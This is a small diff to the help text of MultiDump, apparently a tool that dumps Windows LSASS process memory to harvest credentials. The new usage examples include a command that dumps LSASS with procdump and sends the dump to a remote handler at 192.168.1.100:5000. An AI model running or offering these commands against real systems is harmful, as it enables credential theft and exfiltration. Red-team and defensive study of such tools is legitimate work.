@@ -16,11 +16,15 @@ ParsedArgs ParseArgs(int argc, char* argv[]) {
 		if ((strcmp(argv[i], "-H") == 0 || strcmp(argv[i], "-h") == 0)) {
 #ifdef DEBUG
 			printf("\nUsage:\tMultiDump.exe [-p <ProcDumpPath>] [-l <LocalDumpPath> | -r <RemoteHandlerAddr>] [--procdump] [-v]\n\n");
-			printf("Default:\tLocal mode, dumps LSASS using comsvcs.dll\n");
 			printf("-p\t\tPath to save procdump.exe, use full path. Default to current directory\n");
 			printf("-l\t\tPath to save encrypted dump file, use full path. Default to current directory\n");
 			printf("-r\t\tSet ip:port to connect to a remote handler\n");
 			printf("--procdump\tWrites procdump to disk and use it to dump LSASS\n");
+			printf("-v\t\tEnable verbose mode\n");
+			printf("\nMultiDump defaults in local mode using comsvcs.dll and saves the encrypted dump in the current directory.\n");
+			printf("Examples:\n");
+			printf("\tMultiDump.exe -l C:\\Users\\Public\\lsass.dmp -v\n");
+			printf("\tMultiDump.exe --procdump -p C:\\Tools\\procdump.exe -r 192.168.1.100:5000\n");
 #endif // DEBUG
 			exit(0);
 		}
